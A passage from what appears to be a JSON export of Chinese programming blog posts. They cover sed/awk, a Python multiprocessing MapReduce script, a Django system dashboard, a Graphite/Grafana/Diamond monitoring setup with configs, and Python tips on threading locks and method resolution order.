设置支持多测试环境一起部署,或者说让生成环境的部署一样方便\n",
    "date": {
      "year": "2013",
      "month": "December",
      "day": "02"
    }
  },
  {
    "id": 287,
    "title": "sed and awk",
    "category": "sed",
    "tags": [
      "sed",
      "awk"
    ],
    "url": "/archives/sed-and-awk/",
    "content": "####前言\n\n最近做一个关于sed和awk的分享,这里把源码开源:[sed_and_awk](https://github.com/dongweiming/sed_and_awk),或者直接访问[http://dongweiming.github.io/sed_and_awk](http://dongweiming.github.io/sed_and_awk). 我这个ppt基本覆盖90%以上的知识点.\n\n####一些说明\n\n我测试例子都是在osx下,freebsd的sed和awk和gnu的都略有不同.甚至osx下得版本都不能使用,我会在注释中说明.\n\n* sed\n\n    1. sed 通用\n    2. /usr/local/bin/sed osx下编译的gnu sed\n\n* awk\n\n    1. awk 通用\n    2. gawk  osx编译的gnu awk\n",
    "date": {
      "year": "2013",
      "month": "December",
      "day": "24"
    }
  },
  {
    "id": 288,
    "title": "用python跑mapreduce",
    "category": "mapreduce",
    "tags": [
      "mapreduce"
    ],
    "url": "/archives/yong-pythonpao-mapreduce/",
    "content": "####前言\n\nmapreduce在我的理解里一直都是java等语言的专利,介于python乃至于pypy的性能局限，\n一直没想过用python写分布式任务,最多就是多workers从消息队列取任务执行这样,但是最近一件事真的颠覆\n了我对python的认识.\n\n####先说说起因\n\n某天分享[sed和awk](http://www.dongwm.com/archives/sed-and-awk/),领导突发奇想让我用一些顾问的实际工作需要去我们的大量数据里面获取想要的数据的需求作为一些演示的例子.其中有这样一个需求(我去掉实际一些专业晦涩的用语,用实际的内容来表达):\n\n##### 需求\n\n```python\n1. 有大量的gz压缩文件, 找到其中某2天的数据, 每一行都是一条实际数据\n2. 需要解压缩每个文件,遍历每行找到用逗号隔开的第21列为16233,第23列为27188的行. 以第2列为键计算符合的数量\n3. 在全部统计结果里面根据值计算符合的键的数量: 比如{'a':2, 'b':1, 'c':1},结果就是{1:2, 2:1},也就是2次的有2个,1次的只有一个\n\n```\n\n###### 分析\n\n一上来真的想用awk来搞.但是和其他同事一聊,有几个难点:\n\n```\n1. 2天数据总量在400G以上,用awk还要保留2次哈希结果-不可能用awk\n2. 用python,据同事经验说:只是解压缩这些小文件后读取什么都不做也大概1天多的时间,完全不能忍\n3. 数据还没有放到hadoop, 没有其他更好更快的方法\n\n```\n\n#####解题思路:\n\n1. 最初我想做成这样:\n\n    1. 把需要处理的这些压缩文件放到队列里面\n    2. 启动多进程出队列里面获取要处理的文件,执行,把符合的结果放到共享变量叠加\n    3. 计算完成后从共享变量里面或者数据在生成上面第三条的结果\n\n但是今天讲的是python得mapreduce,也就是我后续的版本,它源于伟大的Doug Hellmann的[Implementing MapReduce with multiprocessing](http://pymotw.com/2/multiprocessing/mapreduce.html)\n\n```python\n#!/usr/bin/env python\n#coding=utf-8\n# python mapreduce 跑数实现\n# Author: Dongweiming\nimport gzip\nimport time\nimport os\nimport glob\nimport collections\nimport itertools\nimport operator\nimport multiprocessing\n\n\nclass AdMapReduce(object):\n\n    def __init__(self, map_func, reduce_func, num_workers=None):\n        '''\n        num_workers: 不指定就是默认可用cpu的核数\n        map_func: map函数: 要求返回格式类似:[(a, 1), (b, 3)]\n        reduce_func: reduce函数: 要求返回格式类似: (c, 10)\n        '''\n        self.map_func = map_func\n        self.reduce_func = reduce_func\n        self.pool = multiprocessing.Pool(num_workers)\n\n    def partition(self, mapped_values):\n        partitioned_data = collections.defaultdict(list)\n        for key, value in mapped_values:\n            partitioned_data[key].append(value)\n        return partitioned_data.items()\n\n    def __call__(self, inputs, chunksize=1):\n        '''调用类的时候被触发'''\n        # 其实都是借用multiprocessing.Pool.map这个函数, inputs是一个需要处理的列表,想想map函数\n        # chunksize表示每次给mapper的量, 这个根据需求调整效率\n        map_responses = self.pool.map(self.map_func, inputs, chunksize=chunksize)\n        # itertools.chain是把mapper的结果链接起来为一个可迭代的对象\n        partitioned_data = self.partition(itertools.chain(*map_responses))\n        # 大家想,上面的就是[(a, [1,2]), (b, [2,3]),列表中的数就是当时符合的次数,reduce就是吧列表符合项sum\n        reduced_values = self.pool.map(self.reduce_func, partitioned_data)\n        return reduced_values\n\n\ndef mapper_match(one_file):\n    '''第一次的map函数,从每个文件里面获取符合的条目'''\n    output = []\n    for line in gzip.open(one_file).readlines():\n        l = line.rstrip().split(',')\n        if int(l[20]) == 16309 and int(l[22]) == 2656:\n            cookie = l[1]\n            output.append((cookie, 1))\n    return output\n\n\ndef reduce_match(item):\n    '''第一次的reduce函数,给相同的key做统计'''\n    cookie, occurances = item\n    return (cookie, sum(occurances))\n\n\ndef mapper_count(item):\n    '''第二次mapper函数,其实就是把某key的总数做键,但是值标1'''\n    _, count = item\n    return [(count, 1)]\n\n\ndef reduce_count(item):\n    '''第二次reduce函数'''\n    freq, occurances = item\n    return (freq, sum(occurances))\n\n\nif __name__ == '__main__':\n    start = time.time()\n    input_files = glob.glob('/datacenter/input/2013-12-1[01]/*')\n    mapper = AdMapReduce(mapper_match, reduce_match)\n    cookie_feq = mapper(input_files)\n    mapper = AdMapReduce(mapper_count, reduce_count)\n    cookie_feq = mapper(cookie_feq)\n    cookie_feq.sort(key=operator.itemgetter(1))\n    for freq, count in cookie_feq:\n        print '{0}\\t{1}\\t{2}'.format(freq, count, freq*count)\n    #cookie_feq.reverse()\n    end = time.time()\n    print 'cost:', end - start\n```\n\n\n#### 后话\n\n哇,看python做mapreduce也是可以这样优雅的, 我是用pypy跑下来,竟然只有了61分钟....\n\n但是其实他只是借助mapreduce思想和多核的硬件基础,其实pool做的还是文件级别的处理.假如是少量的大文件,就未必有这样好的效果了.\n\n我想很多时候这样的工作都可以交给这个Admapreduce类来做\n",
    "date": {
      "year": "2014",
      "month": "January",
      "day": "09"
    }
  },
  {
    "id": 289,
    "title": "搜集系统信息的dashboard",
    "category": "django-linux-dash",
    "tags": [
      "django-linux-dash"
    ],
    "url": "/archives/sou-ji-xi-tong-xin-xi-de-dashboard/",
    "content": "#### 前言\n\n过年在家无聊, 发现个挺有意思的项目: [linux-dash](https://github.com/afaqurk/linux-dash),就是使用Twitter的Bootstrap做的管理模板,可以显示服务器信息, 负载, 内存,进程,硬盘,用户,安装/未安装的软件信息,网卡IP,网速,以及网络状态,在线用户等. 但是有2个问题:\n\n1. 它是php的...\n2. 它获取信息都是通过shell下得系统命令\n\n我就用django写了一个python版的[django-linux-dash](https://github.com/dongweiming/django-linux-dash):本来想用flask,结果被人用了,但是问题也是通过subprocess调用命令获取数据,这个轮子有以下优点:\n\n1. 不仅支持linux,也支持OS X\n2. 使用[psutil](http://code.google.com/p/psutil/), 项目完全不调用shell命令\n\n#### 安装和使用\n\n需要django>=1.4以及psutils模块\n\n```\n$pip install/easy_install django\n$pip install/easy_install psutil\n```\n\nPS: OS X 还需要[netifaces](https://pypi.python.org/pypi/netifaces)模块用于获取网卡ip\n\n```\n$pip install/easy_install netifaces\n```\n\n启动:\n\n```\n$cd /You/install/path\n$git clone https://github.com/dongweiming/django-linux-dash && cd django-linux-dash\n$python manage.py runserver 0.0.0.0:8000\n```\n\n打开浏览器输入 http://localhost:8000 就可以看见了...\n\nTODO:\n\n1. 目前还没有添加测速功能,因为我希望不要一直傻瓜式的下载某文件,根据用时计算平均值,因为第一它需要时间才会显示个速度,其次是不实时不能循环实时\n2. 添加更多信息模块\n3. 增加用户登陆和权限控制\n...\n",
    "date": {
      "year": "2014",
      "month": "February",
      "day": "09"
    }
  },
  {
    "id": 290,
    "title": "使用grafana和Diamond构建Graphite监控系统",
    "category": "grafana",
    "tags": [
      "grafana",
      "Diamond",
      "Graphite"
    ],
    "url": "/archives/shi-yong-grafanahe-diamondgou-jian-graphitejian-kong-xi-tong/",
    "content": "#### 前言\n\n在豆瓣开源项目里面有个[graph-index](https://github.com/douban/graph-index), 提供监控服务器的状态的目录索引,基于[graph-explorer](https://github.com/vimeo/graph-explorer). 类似衍生物很多,就包括我要说的本文用到的项目.先看看我的测试环境的几个截图\n\n\n![](https://cloud.githubusercontent.com/assets/841395/9101045/7a64742a-3c14-11e5-92e7-012c713596e3.png)\n![](https://cloud.githubusercontent.com/assets/841395/9101046/7a6a2ec4-3c14-11e5-8aeb-0158c20e8c6b.png)\n\n\n#### 一些关键词说明\n\n1. graphite-web # graphite组件之一, 提供一个django的可以高度扩展的实时画图系统\n2. Whisper # graphite组件之一, 实现数据库存储. 它比rrdtool要慢，因为whisper是使用python写的，而rrdtool是使用C写的。然而速度之间的差异很小\n3. Carbon # 数据收集的结果会传给它, 它会解析数据让它可用于实时绘图. 它默认可会提示一些类型的数据,监听2003和2004端口\n4. [Diamond](https://github.com/BrightcoveOS/Diamond) # 他是一个提供了大部分数据收集结果功能的结合,类似cpu, load, memory以及mongodb,rabbitmq,nginx等指标.这样就不需要我大量的写各种类型,因为它都已经提供,并且它提供了可扩展的自定义类型(最后我会展示一个我自己定义的类型)\n5. [grafana](https://github.com/torkelo/grafana) # 这个面板是基于node, [kibana](https://github.com/elasticsearch/kibana),并且可以在线编辑. 因为是kibana,所以也用到了开元搜索框架[elasticsearch](https://github.com/elasticsearch/elasticsearch)\n\nPS: 其他工具可以参考这里[Tools That Work With Graphite](http://graphite.readthedocs.org/en/1.0/tools.html)\n\n#### 原理解析\n\n我没有看实际全部代码,大概的流程是这样的:\n\n1. 启动Carbon-cache等待接收数据(carbon用的是twisted)\n2. 启动graphite-web给grafana提供实时绘图数据api\n3. 启动grafana,调用graphite-web接口获取数据展示出来\n4. Diamond定期获取各类要监测的类型数据发给carbon(默认是5分钟,默认一小时自动重载一次配置)\n\n#### 实现我这个系统需要做的事情\n\n##### 安装graphite相关组件(我这里用的是centos)\n\n```\nyum --enablerepo=epel install graphite-web python-carbon -y\n```\n\n###### 安装grafana需要的组件\n\n```\n# 增加elasticsearch的repo:\nsudo  rpm --import http://packages.elasticsearch.org/GPG-KEY-elasticsearch\n$cat /etc/yum.repos.d/elasticsearch.repo\n[elasticsearch-1.0]\nname=Elasticsearch repository for 1.0.x packages\nbaseurl=http://packages.elasticsearch.org/elasticsearch/1.0/centos\ngpgcheck=1\ngpgkey=http://packages.elasticsearch.org/GPG-KEY-elasticsearch\nenabled=1\nsudo yum install nginx nodejs npm java-1.7.0-openjdk elasticsearch -y\n```\n\n##### 下载Diamond和grafana\n\n```\ngit clone https://github.com/torkelo/grafana\ncd grafana\nsudo npm install\nsudo pip install django-cors-headers configobj # 这可能因为我环境中已经有了一些模块，看缺什么安装什么\ngit clone https://github.com/BrightcoveOS/Diamond\ncd Diamond\n```\n##### 开始修改配置\n\n1. 添加cors支持\n\n在/usr/lib/python2.6/site-packages/graphite/app_settings.py:\n\nINSTALLED_APPS里面添加corsheaders, MIDDLEWARE_CLASSES里面添加'corsheaders.middleware.CorsMiddleware'\n\n2. 使用nginx使用grafana\n\n在nginx.conf 添加类型的一段配置\n\n```\nserver {\n  listen                *:80 ;\n\n  server_name           monitor.dongwm.com; # 我用了虚拟主机\n  access_log            /var/log/nginx/kibana.myhost.org.access.log;\n\n  location / {\n    add_header 'Access-Control-Allow-Origin' \"$http_origin\";\n    add_header 'Access-Control-Allow-Credentials' 'true';\n    root  /home/operation/dongwm/grafana/src;\n    index  index.html  index.htm;\n  }\n\n  location ~ ^/_aliases$ {\n    proxy_pass http://127.0.0.1:9200;\n    proxy_read_timeout 90;\n  }\n  location ~ ^/_nodes$ {\n    proxy_pass http://127.0.0.1:9200;\n    proxy_read_timeout 90;\n  }\n  location ~ ^/.*/_search$ {\n    proxy_pass http://127.0.0.1:9200;\n    proxy_read_timeout 90;\n  }\n  location ~ ^/.*/_mapping$ {\n    proxy_pass http://127.0.0.1:9200;\n    proxy_read_timeout 90;\n  }\n\n  # Password protected end points\n  location ~ ^/kibana-int/dashboard/.*$ {\n    proxy_pass http://127.0.0.1:9200;\n    proxy_read_timeout 90;\n    limit_except GET {\n      proxy_pass http://127.0.0.1:9200;\n      auth_basic \"Restricted\";\n      auth_basic_user_file /etc/nginx/conf.d/dongwm.htpasswd;\n    }\n  }\n  location ~ ^/kibana-int/temp.*$ {\n    proxy_pass http://127.0.0.1:9200;\n    proxy_read_timeout 90;\n    limit_except GET {\n      proxy_pass http://127.0.0.1:9200;\n      auth_basic \"Restricted\";\n      auth_basic_user_file /etc/nginx/conf.d/dongwm.htpasswd;\n    }\n  }\n```\n\n3. 修改grafana的src/config.js:\n\ngraphiteUrl: \"http://\"+window.location.hostname+\":8020\", # 下面会定义graphite-web启动在8020端口\n\n4. 修改Diamond的配置conf/diamond.conf\n\n```\ncp conf/diamond.conf.example conf/diamond.conf\n```\n\n主要修改监听的carbon服务器和端口,以及要监控什么类型的数据,看我的一个全文配置\n\n```\n################################################################################\n# Diamond Configuration File\n################################################################################\n\n################################################################################\n### Options for the server\n[server]\n\n# Handlers for published metrics.\nhandlers = diamond.handler.graphite.GraphiteHandler, diamond.handler.archive.ArchiveHandler\n\n# User diamond will run as\n# Leave empty to use the current user\nuser =\n\n# Group diamond will run as\n# Leave empty to use the current group\ngroup =\n\n# Pid file\npid_file = /home/dongwm/logs/diamond.pid # 换了pid的地址,因为我的服务都不会root启动\n\n# Directory to load collector modules from\ncollectors_path = /home/dongwm/Diamond/src/collectors # 收集器的目录,这个/home/dongwm/Diamond就是克隆代码的地址\n\n# Directory to load collector configs from\ncollectors_config_path = /home/dongwm/Diamond/src/collectors\n\n# Directory to load handler configs from\nhandlers_config_path = /home/dongwm/Diamond/src/diamond/handler\n\nhandlers_path = /home/dongwm/Diamond/src/diamond/handler\n\n# Interval to reload collectors\ncollectors_reload_interval = 3600 # 收集器定期会重载看有没有配置更新\n\n################################################################################\n### Options for handlers\n[handlers]\n\n# daemon logging handler(s)\nkeys = rotated_file\n\n### Defaults options for all Handlers\n[[default]]\n\n[[ArchiveHandler]]\n\n# File to write archive log files\nlog_file = /home/dongwm/logs/diamond_archive.log\n\n# Number of days to keep archive log files\ndays = 7\n\n[[GraphiteHandler]]\n### Options for GraphiteHandler\n\n# Graphite server host\nhost = 123.126.1.11\n\n# Port to send metrics to\nport = 2003\n\n# Socket timeout (seconds)\ntimeout = 15\n\n# Batch size for metrics\nbatch = 1\n\n[[GraphitePickleHandler]]\n### Options for GraphitePickleHandler\n\n# Graphite server host\nhost = 123.126.1.11\n\n# Port to send metrics to\nport = 2004\n\n# Socket timeout (seconds)\ntimeout = 15\n\n# Batch size for pickled metrics\nbatch = 256\n\n[[MySQLHandler]]\n### Options for MySQLHandler\n\n# MySQL Connection Info 这个可以你的会不同\nhostname    = 127.0.0.1\nport        = 3306\nusername    = root\npassword    =\ndatabase    = diamond\ntable       = metrics\n# INT UNSIGNED NOT NULL\ncol_time    = timestamp\n# VARCHAR(255) NOT NULL\ncol_metric  = metric\n# VARCHAR(255) NOT NULL\ncol_value   = value\n\n[[StatsdHandler]]\nhost = 127.0.0.1\nport = 8125\n\n[[TSDBHandler]]\nhost = 127.0.0.1\nport = 4242\ntimeout = 15\n\n[[LibratoHandler]]\nuser = user@example.com\napikey = abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz01\n\n[[HostedGraphiteHandler]]\napikey = abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz01\ntimeout = 15\nbatch = 1\n\n# And any other config settings from GraphiteHandler are valid here\n\n[[HttpPostHandler]]\n\n### Urp to post the metrics\nurl = http://localhost:8888/\n### Metrics batch size\nbatch = 100\n\n\n################################################################################\n### Options for collectors\n[collectors]\n[[TencentCollector]] # 本来[collectors]下试没有东西的,这个是我定制的一个类型\nttype = server\n[[MongoDBCollector]] # 一般情况,有一些类型是默认enabled = True,也就是启动的,但是大部分是默认不启动《需要显示指定True\nenabled = True\nhost = 127.0.0.1 # 每种类型的参数不同\n[[TCPCollector]]\nenabled = True\n[[NetworkCollector]]\nenabled = True\n[[NginxCollector]]\nenabled = False # 没开启nginx_status 开启了也没用\n[[ SockstatCollector]]\nenabled = True\n[[default]]\n### Defaults options for all Collectors\n\n# Uncomment and set to hardcode a hostname for the collector path\n# Keep in mind, periods are seperators in graphite\n# hostname = my_custom_hostname\n\n# If you prefer to just use a different way of calculating the hostname\n# Uncomment and set this to one of these values:\n\n# smart             = Default. Tries fqdn_short. If that's localhost, uses hostname_short\n\n# fqdn_short        = Default. Similar to hostname -s\n# fqdn              = hostname output\n# fqdn_rev          = hostname in reverse (com.example.www)\n\n# uname_short       = Similar to uname -n, but only the first part\n# uname_rev         = uname -r in reverse (com.example.www)\n\n# hostname_short    = `hostname -s`\n# hostname          = `hostname`\n# hostname_rev      = `hostname` in reverse (com.example.www)\n\n# hostname_method = smart\n\n# Path Prefix and Suffix\n# you can use one or both to craft the path where you want to put metrics\n# such as: %(path_prefix)s.$(hostname)s.$(path_suffix)s.$(metric)s\n# path_prefix = servers\n# path_suffix =\n\n# Path Prefix for Virtual Machines\n# If the host supports virtual machines, collectors may report per\n# VM metrics. Following OpenStack nomenclature, the prefix for\n# reporting per VM metrics is \"instances\", and metric foo for VM\n# bar will be reported as: instances.bar.foo...\n# instance_prefix = instances\n\n# Default Poll Interval (seconds)\n# interval = 300\n\n################################################################################\n### Options for logging\n# for more information on file format syntax:\n# http://docs.python.org/library/logging.config.html#configuration-file-format\n\n[loggers]\n\nkeys = root\n\n# handlers are higher in this config file, in:\n# [handlers]\n# keys = ...\n\n[formatters]\n\nkeys = default\n\n[logger_root]\n\n# to increase verbosity, set DEBUG\nlevel = INFO\nhandlers = rotated_file\npropagate = 1\n\n[handler_rotated_file]\n\nclass = handlers.TimedRotatingFileHandler\nlevel = DEBUG\nformatter = default\n# rotate at midnight, each day and keep 7 days\nargs = ('/home/dongwm/logs/diamond.log', 'midnight', 1, 7)\n\n[formatter_default]\n\nformat = [%(asctime)s] [%(threadName)s] %(message)s\ndatefmt =\n```\n\n##### 启动相关服务\n\n```\nsudo /etc/init.d/nginx reload\nsudo /sbin/chkconfig --add elasticsearch\nsudo service elasticsearch start\nsudo service carbon-cache restart\nsudo python /usr/lib/python2.6/site-packages/graphite/manage.py runserver 0.0.0.0:8020 # 启动graphite-web到8020端口\n```\n\n###### 在每个要搜集信息的agent上面安装Diamond,并启动:\n\n```\ncd /home/dongm/Diamond\npython ./bin/diamond --configfile=conf/diamond.conf\n\n# PS: 也可以添加 -l -f在前台显示\n```\n\n##### 自定义数据搜集类型，也就是上面的TencentCollector\n\n```\n# coding=utf-8\n\n\"\"\"\n获取腾讯微博爬虫的业务指标\n\"\"\"\n\nimport diamond.collector\nimport pymongo\nfrom pymongo.errors import ConnectionFailure\n\n\nclass TencentCollector(diamond.collector.Collector): # 需要继承至diamond.collector.Collector\n    PATH = '/home/dongwm/tencent_data'\n\n    def get_default_config(self):\n        config = super(TencentCollector, self).get_default_config()\n        config.update({\n            'enabled':  'True',\n            'path':     'tencent',\n            'method':   'Threaded',\n            'ttype':    'agent' # 服务类型 包含agent和server\n        })\n        return config\n\n    def collect(self):\n        ttype = self.config['ttype']\n        if ttype == 'server':\n            try:\n                db = pymongo.MongoClient()['tmp']\n            except ConnectionFailure:\n                return\n            now_count = db.data.count()\n            try:\n                last_count = db.diamond.find_and_modify(\n                    {}, {'$set': {'last': now_count}}, upsert=True)['last']\n            except TypeError:\n                last_count = 0\n            self.publish('count', now_count)\n            self.publish('update', abs(last_count - now_count))\n        if ttype == 'agent':\n            # somethings..........\n```\n\n##### 添加你要绘图的类型. 这个就是打开grafana, 添加不同的row.给每个添加panel.选择metric的类型就好了\n",
    "date": {
      "year": "2014",
      "month": "April",
      "day": "01"
    }
  },
  {
    "id": 291,
    "title": "分享一个准备给公司讲python高级编程的slide",
    "category": "python",
    "tags": [
      "python"
    ],
    "url": "/archives/fen-xiang-%5B%3F%5D-ge-zhun-bei-gei-gong-si-jiang-pythongao-ji-bian-cheng-de-slide/",
    "content": "#### 前言\n\n我以前在学习python模块的时候,曾经翻译[pymotw](http://pymotw.com/2/py-modindex.html#)的文章,其实还是有抄袭的嫌疑,从最近开始逐渐直接阅读python标准库源码, 收获颇多. 我现在不愿意教一些从网上或者书里提到的知识点,而更愿意根据我工作中常见的需求去挖掘对应的python的解法.也是在过程中对一些东西有了比较深的理解. 这个ppt是从[像黑客一样使用 Linux 命令行](https://linuxtoy.org/archives/using-cli-like-a-hacker.html)获得的灵感. 然后角度为<python高级编程>, 还用到了webfonts娃娃体^.^\n\n![](https://dl.dropboxusercontent.com/u/95512723/images/expert_python.png)\n\nPS: 特别推荐github上看到的\"雨痕\"的[学习笔记](https://github.com/qyuhen/book). 建议大家都好好看看.\n\n\n#### 找到它\n\n[Expert-Python](http://dongweiming.github.io/Expert-Python)\n或者直接下载代码: [github](https://github.com/dongweiming/Expert-Python)\n\n但是注意我的字体内嵌项目里面, 请注意流量,避免移动设备直接访问或者强制刷新\n\n##### UPDATE: 2015-02-02\n\n我已经把视频放到youtube上了: https://www.youtube.com/watch?v=bf5qpFFxo9g 大家可以选择在线看\n\n#### 目录\n\n1. XX不理解python竟然没有end....\n1. 设置全局变量\n1. 字符串格式化\n1. 操作列表\n1. 操作字典\n1. 字典视图\n1. vars\n1. from __future__ import unicode_literals\n1. from __future__ import absolute_import\n1. 不是支持了绝对引入,而是拒绝隐式引入\n1. 我靠,我的需求呢? -- 在很多开源项目是拒绝你第一次的隐式用法的,\n1. 一个关于编码的问题\n1. 原因是: encoding_example里面没有对文字自动转化为unicode,默认是ascii编码\n1. super 当子类调用父类属性时一般的做法是这样\n1. super的一种用法\n1. 假如不用super会这么惨\n1. 手写一个迭代器\n1. 标准迭代器\n1. 生成器\n1. 斐波那契数列\n1. 其实yield和协程关系很密切\n1. 来个回调(阻塞的)\n1. 来个回调(异步的)\n1. 看到这里, 就得说说contextmanager\n1. 包导入\n1. 包构建\\_\\_all\\_\\_\n1. 包构建\\_\\_path\\_\\_\n1. 静态方法和类方法的区别\n1. 静态方法和类方法的区别其实是在这里\n1. \\_\\_slots\\_\\_\n1. Packaging Tools的未来\n1. wheel(即将替代Eggs的二进制包格式)的优点\n1. 装饰器\n1. 给函数的类装饰器\n1. 给类的函数装饰器\n1. 带参数的装饰器\n1. @property\n1. @property的另外使用方法\n1. 元类是什么\n1. 模拟生成一个类\n1. 元类: \\_\\_metaclass\\_\\_(实现前面的Hello类)\n1. 一个难懂的元类\n1. 描述符\n1. 模块: itertools\n1. 模块: collections(一)\n1. 模块: collections(二)\n1. 模块: collections(三)\n1. 模块: collections(四)\n1. operator模块(一)\n1. operator模块(二)\n1. operator模块(三)\n1. functools模块之partial\n1. functools模块之wraps\n1. functools模块之cmp_to_key\n1. functools模块之total_ordering\n1. 开发陷阱(一) 可变默认参数\n1. 开发陷阱(二) 闭包变量绑定\n1. 开发陷阱(二) 闭包应该的用法\n1. 在合适的地方用合适的技巧\n1. 不是它不好,而是你没有用好\n1. ipython的技巧(一)\n1. ipython的技巧(二)\n1. 联系方式\n\n#### UPDATE 2014.04.11\n\n今天下午分享了这个ppt. 并且用quicktime录像. 想听的可以从[百度网盘](http://pan.baidu.com/s/1bnnaJaZ)下载或者在线看(793.6M). 时长2小时零一分.\n\n中间有个列表去重. 有同学说去重后无法保证第一次出现重复数据位置的顺序.\n\n刚才想起来试了一下:\n\n```python\n>>> l = [1, 2, 4, 7, 2, 1, 8, 6, 1]\n    >>> list(set(l))\n    [1, 2, 4, 6, 7, 8]\n    >>> {}.fromkeys(l).keys()\n    [1, 2, 4, 6, 7, 8]  # 注意这个和上面结果是一样的,也就是内部实现的去重原理相同\n    >>> l = ['a', 'b', 'c', 'd', 'b', 'a']\n    >>> list(set(l))\n    ['a', 'c', 'b', 'd']\n    >>> {}.fromkeys(l).keys()\n    ['a', 'c', 'b', 'd']\n    >>> from collections import OrderedDict\n    >>> OrderedDict().fromkeys(l).keys()  # 只能使用这样的方法实现保证顺序的实现\n    [1, 2, 4, 7, 8, 6]                                 # 感谢@杨博的提醒\n```\n新的PYPI的DEMO: [http://pypi-preview.a.ssl.fastly.net](http://pypi-preview.a.ssl.fastly.net)\n",
    "date": {
      "year": "2014",
      "month": "April",
      "day": "04"
    }
  },
  {
    "id": 292,
    "title": "speakerdeck",
    "category": "python",
    "tags": [
      "python",
      "tornado",
      "celery",
      "restapi",
      "expect",
      "portforward"
    ],
    "url": "/archives/speakerdeck/",
    "content": "#### 前言\n\n今天是在Ad的最后一天,本来准备了一个分享.关于业务中一些吐槽和我一些trick的用法, 有兴趣的可以下载[speakerdeck](https://github.com/dongweiming/speakerdeck)\n\n#### 主题\n\n1. celery celery2/celery3, py-amqp, kombu的用法, celery和djangocelery的集合\n2. expect 使用expect自动登录复杂的服务器\n3. mapreduce 一个并行处理文件的例子,说明使用python跑mapreduce多么厉害\n4. portforward 端口转发\n5. restapi 我眼中的restapi(pdf)\n6. tornado 使用tornado一部非阻塞\n\n演示的tmux脚本:\n\n```\n#!/bin/bash\nSESSION=$USER\nCOMMAND='http Space http://localhost:8000/sleep'\n\ntmux new-session -d -s $SESSION\n\ntmux new-window -t $SESSION -n 'Logs'\ntmux split-window -h\ntmux select-pane -t 0\ntmux send-keys $COMMAND C-m\ntmux select-pane -t 1\ntmux send-keys $COMMAND C-m\ntmux split-window -v\ntmux send-keys $COMMAND C-m\ntmux select-pane -t 0\ntmux split-window -v\ntmux send-keys $COMMAND C-m\n# Attach to session\ntmux attach-session -t $SESSION\n```\n",
    "date": {
      "year": "2014",
      "month": "April",
      "day": "18"
    }
  },
  {
    "id": 293,
    "title": "线程锁的一个大坑",
    "category": "python",
    "tags": [
      "threading",
      "Lock"
    ],
    "url": "/archives/xian-cheng-suo-de-%5B%3F%5D-ge-da-keng/",
    "content": "#### 前言\n\n原来的一位同事@炮哥, 昨天在QQ问我: \"想请教下一个线程获得lock之后，也可能被其他的线程释放掉？这个是因为线程之间的资源是共享的吗？这样的话普通的thread lock 都是不安全的了？\". 我第一反应就是怎么可能:'谁加锁谁解锁呗,别的线程怎么能解锁？'\n\n炮哥发来一段python官网的文档说明:\n\n```\nA factory function that returns a new primitive lock object. Once a thread has acquired it, subsequent attempts to acquire it block, until it is released; any thread may release it.\n```\n\n最有最后一句前是分号. 简单地说,一个线程获取锁, 以后的尝试获取都会被阻塞,除非它会释放. 但是**同时**其他其他线程可以释放\n\n好,写个例子验证下:\n\n```\nimport threading\nimport time\n\nlock = threading.Lock()\n\ndef lock_holder(lock):\n    print('Starting')\n    while True:\n        lock.acquire()\n        print('Holding')\n        time.sleep(100)\n        print('Sleep done')\n\ndef lock_release(lock):\n    time.sleep(1) # 保证顺序\n    lock.release()\n    print('Release it')\n\n\nholder = threading.Thread(target=lock_holder, args=(lock,), name='LockHolder')\nholder.setDaemon(True)\nholder.start()\n\n#lock_release(lock)\nrelease = threading.Thread(target=lock_release, args=(lock,), name='release')\nrelease.start()\n\nholder = threading.Thread(target=lock_holder, args=(lock,), name='LockHolder')\nholder.setDaemon(True)\nholder.start()\n```\n\n奇迹发生了.... 线程b果然可以释放线程a的锁,颠覆人生观啊.\n\nPS: 但是Rlock不会被其他线程释放,因为它记录该线程的所有者\n",
    "date": {
      "year": "2014",
      "month": "April",
      "day": "18"
    }
  },
  {
    "id": 294,
    "title": "python的魔法(一): 基本知识",
    "category": "python",
    "tags": [
      "python"
    ],
    "url": "/archives/pythonde-mo-fa/",
    "content": "#### 前言\n\n最近读了一篇[A collection of not-so-obvious Python stuff you should know!](http://nbviewer.ipython.org/github/rasbt/python_reference/blob/master/not_so_obvious_python_stuff.ipynb),感觉受益颇多. 翻译过来(非直接翻译),再加上一些我的理解和注释. 让大家注意python鲜为人知的\"魔法\". 我会分2篇\n\n##### python多继承(C3)\n\n```python\nIn [1]: class A(object):\n   ...:         def foo(self):\n   ...:                 print(\"class A\")\n   ...:         \n\nIn [2]: class B(object):\n   ...:         def foo(self):\n   ...:                 print(\"class B\")\n   ...:         \n\nIn [3]: class C(A, B):\n   ...:         pass\n   ...: \n\nIn [4]: C().foo()\nclass A # 例子很好懂, C继承了A和B，从左到右,发现A有foo方法,返回了\n```\n\n看起来都是很简单, 有次序的从底向上,从前向后找,找到就返回. 再看例子:\n\n```python\nIn [5]: class A(object):\n   ...:        def foo(self):\n   ...:               print(\"class A\")\n   ...:         \n\nIn [6]: class B(A):\n   ...:        pass\n   ...: \n\nIn [7]: class C(A):\n   ...:        def foo(self):\n   ...:               print(\"class C\")\n   ...:         \n\nIn [8]: class D(B,C):\n   ...:        pass\n   ...: \n\nIn [9]: D().foo()\nclass C # ? 按道理, 顺序是 D->B->A,为什么找到了C哪去了\n```\n\n这也就涉及了MRO([Method Resolution Order](http://python-history.blogspot.ru/2010/06/method-resolution-order.html)):\n\n```python\nIn [10]: D.__mro__\nOut[10]: (__main__.D, __main__.B, __main__.C, __main__.A, object)\n```\n\n简单的理解其实就是新式类是广度优先了， D->B, 但是发现C也是继承A，就先找C，最后再去找A\n\n#### 列表的+和+=, append和extend\n\n```python\nIn [17]: print('ID:', id(a_list))\n('ID:', 4481323592)\n\nIn [18]: a_list += [1]\n\nIn [19]: print('ID (+=):', id(a_list))\n('ID (+=):', 4481323592) # 使用+= 还是在原来的列表上操作\n\nIn [20]: a_list = a_list + [2]\n\nIn [21]: print('ID (list = list + ...):', id(a_list))\n('ID (list = list + ...):', 4481293056) # 简单的+其实已经改变了原有列表\nIn [28]: a_list = []\n\nIn [29]: id(a_list)\nOut[29]: 4481326976\n\nIn [30]: a_list.append(1)\n\nIn [31]: id(a_list)\nOut[31]: 4481326976 # append 是在原有列表添加\n\nIn [32]: a_list.extend([2])\n\nIn [33]: id(a_list)\nOut[33]: 4481326976 # extend 也是在原有列表上添加\n```\n\n#### 